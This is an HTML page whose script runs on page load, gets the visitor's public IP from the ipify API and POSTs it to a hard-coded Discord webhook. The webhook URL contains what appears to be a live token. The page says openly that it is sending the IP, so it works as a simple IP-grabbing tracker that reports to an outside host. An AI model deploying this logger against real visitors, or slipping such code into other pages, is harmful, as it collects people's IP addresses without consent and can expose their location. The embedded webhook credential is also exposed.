<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send IP to Webhook</title>
    <script>
        // Function to get the user's public IP
        function getUserIP() {
            fetch('https://api.ipify.org?format=json')  // Use ipify API to get IP
                .then(response => response.json())  // Parse the JSON response
                .then(data => {
                    const ip = data.ip;  // Extract IP from the response
                    console.log("User IP: " + ip);
                    sendIPToWebhook(ip);  // Send IP to the webhook
                })
                .catch(error => {
                    console.error('Error getting IP:', error);  // Handle errors
                });
        }

        // Function to send the IP to a webhook
        function sendIPToWebhook(ip) {
            const webhookURL = 'https://discord.com/api/webhooks/1298060269746000003/m9Kfr8xelRc-S2prFOgfjBi2OH4fEZLYYi6MPioKq_st23cEFvTLcirHGsJBFDLKOF0b'; // Replace with your webhook URL
            const payload = JSON.stringify({ ip: ip });

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: payload  // Send the IP in the body of the POST request
            })
            .then(response => response.json())
            .then(data => {
                console.log('Webhook Response:', data);  // Handle response from webhook
            })
            .catch(error => {
                console.error('Error sending IP to webhook:', error);  // Handle errors
            });
        }

        // Run the function as soon as the page loads
        window.onload = getUserIP;
    </script>
</head>
<body>
    <h1>Sending IP to Webhook</h1>
    <p>Your IP is being sent to the webhook...</p>
</body>
</html>
